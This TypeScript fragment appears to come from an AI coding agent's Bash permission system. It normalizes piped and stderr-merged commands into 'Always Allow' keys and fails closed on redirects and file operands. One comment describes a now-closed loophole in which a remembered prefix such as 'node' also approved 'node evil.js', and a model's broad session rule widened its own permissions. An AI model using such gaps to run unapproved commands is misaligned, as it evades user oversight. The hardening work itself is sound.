/** UA12.87 follow-up — a `wc` flag cluster that only picks a count. */
const WC_COUNT_FLAGS = /^-[lwcmL]+$/;
/** UA12.87 follow-up — a `grep` flag cluster that takes no value and adds no input (no -r, -f, -e, -d, --include …). */
const GREP_MATCH_FLAGS = /^-[ivcnEFwxoqs]+$/;

/**
 * UA12.87 follow-up `[security]` — true when a parsed filter stage can read only
 * its stdin: `tail`/`head` with count flags alone, `wc` with count flags alone,
 * `grep` with match flags and exactly ONE operand (the pattern). Any other word
 * (a file operand, a recursive or pattern-file flag, `--files0-from`, `--`, a
 * flag that takes a value) refuses the stage, so the line keys nothing.
 */
function filterStageReadsStdinOnly(argv: readonly string[]): boolean {
  const [name, ...words] = argv;
  if (name === 'tail' || name === 'head') {
    for (let i = 0; i < words.length; i++) {
      const word = words[i] ?? '';
      if ((word === '-n' || word === '-c') && /^[+-]?\d+$/.test(words[i + 1] ?? '')) i++;
      else if (!TAIL_HEAD_COUNT_FLAG.test(word)) return false;
    }
    return true;
  }
  if (name === 'wc') return words.every(word => WC_COUNT_FLAGS.test(word));
  if (name === 'grep') {
    const operands = words.filter(word => !word.startsWith('-'));
    return operands.length === 1 && words.every(word => !word.startsWith('-') || GREP_MATCH_FLAGS.test(word));
  }
  return false;
}

/**
 * UA12.87 — a pure stderr merge at the end of the line: a file-descriptor form with no file behind it.
 * Follow-up: spaces only, so a line terminator before it is never folded into the one-line spelling.
 */
const STDERR_MERGE_SUFFIX = / +2>&1$/;

/**
 * UA12.87 `[ux]` — the line with its BENIGN plumbing removed: trailing
 * ` | <filter …>` stages whose filter is a bare {@link READ_ONLY_PIPE_FILTERS}
 * name over plain words that cannot name a file ({@link filterStageReadsStdinOnly}),
 * then one trailing pure stderr merge ` 2>&1`. Anything
 * else is returned as it was (trimmed), and the caller's own parse refuses it.
 *
 * Before this row `npm test 2>&1` and `npm test | tail -20` — the common agent
 * spelling of a test run — minted no Always Allow key, because the plain-command
 * parser refuses every redirect and pipe. Upstream v0.14.0 keys nothing here
 * either (`getBashRememberKey` reads `parseSimpleCommand`, which rejects both),
 * so this is a deliberate divergence in the KEYING direction, taken by the row
 * (origin lane UA-cr7 P-UAcr7-3, 2026-10-02) and bounded to what Claude's own
 * pages already treat as no effect of the command: a file-descriptor redirect
 * "with no file behind" it (permissions.md#redirections) and a pipeline stage
 * from the documented read-only set (#read-only-commands), for which Claude's
 * dialog saves no rule of its own (#compound-commands).
 *
 * It fails CLOSED. The pipe must be spelled ` | ` (spaced; `|&` and an unspaced
 * `|` are not normalized), each filter stage must parse as one plain command
 * headed by the bare name (`/tmp/x/tail` is not `tail`), and nothing is believed
 * until the remaining producer parses as one plain command too — a producer and
 * filters that each parse with balanced quotes prove every ` | ` was unquoted,
 * because the scan of the whole line is then the concatenation of their scans.
 * A file redirect (`> out.txt`, `2>err.txt`, `>/dev/null`), `tee`, `xargs`, a
 * substitution in a filter, or a filter after a redirect stays on the line, so
 * it keys nothing, exactly as before. The dangerous floor reads the RAW line
 * and the producer ({@link bashRememberKey}), so plumbing can neither create nor
 * hide a dangerous head.
 */
export function bashLineWithoutPlumbing(command: string): string {
  const original = command.trim();
  // Follow-up: a line terminator anywhere keeps the line whole (no one-line spelling is believed past it).
  if (/[\r\n\u2028\u2029]/.test(original)) return original;
  let line = original;
  for (let at = line.lastIndexOf(' | '); at > 0; at = line.lastIndexOf(' | ')) {
    const filter = parsePlainCommandArgv(line.slice(at + 3));
    if (filter === null || !READ_ONLY_PIPE_FILTERS.has(filter[0] ?? '') || !filterStageReadsStdinOnly(filter)) break;
    line = line.slice(0, at).replace(/ +$/, '');
  }
  line = line.replace(STDERR_MERGE_SUFFIX, '');
  return line !== original && parsePlainCommandArgv(line) !== null ? line : original;
}

/**
 * UA12.70/UA12.71 — the session key a Bash rule's CONTENT honestly names, or
 * `null` (Pi's `addRules` at `session`, and what a hook may echo).
 *
 * A wildcard rule (`<prefix>:*` or `<prefix> *`) is accepted only when its
 * prefix IS a leading-words or by-name key — the class the same click would
 * remember — so `Bash(git:*)`, `Bash(node:*)` and `Bash(npm run:*)` store
 * nothing. A rule with no wildcard names one command and stores the key that
 * command's own click would mint.
 */
export function bashSessionKeyForRuleContent(ruleContent: string): string | null {
  const trimmed = ruleContent.trim();
  const wildcard = trimmed.endsWith(':*') || trimmed.endsWith(' *');
  const body = wildcard ? trimmed.slice(0, -2).trim() : trimmed;
  if (!body) return null;
  const key = bashSessionWhitelistKey(body, body.split(/\s+/)[0] ?? '');
  if (key === null) return null;
  if (!wildcard) return key;
  if (isExactRememberKey(key)) return null;
  return key === body.toLowerCase().split(/\s+/).join(' ') ? key : null;
}

/**
 * D1.314 — the READ side of {@link bashSessionWhitelistKey}: which stored key, if
 * any, covers this command line.
 *
 * UA12.70 — it is now KEY EQUALITY, upstream's reading: the line's own key is
 * computed exactly as a click on it would compute it and looked up once. The
 * longest-first walk over every leading-token prefix it replaced let a stored
 * `npm install lodash` cover `npm install lodash evil-pkg`, and a stored `node`
 * cover `node evil.js` — the key was a floor on the width, not the width. A
 * model's broad session rule (`Bash(git:*)`) therefore no longer stores a key at
 * all ({@link bashSessionKeyForRuleContent}).
 *
 * It is NOT a floor. The caller still tests the whole command line against the
 * dangerous list; this answers only "was this remembered".
 */
export function whitelistedBashPrefix(
  command: string,
  isWhitelisted: (key: string) => boolean,
): string | null {
  const key = bashRememberKey(command);
  return key !== null && isWhitelisted(key) ? key : null;
}
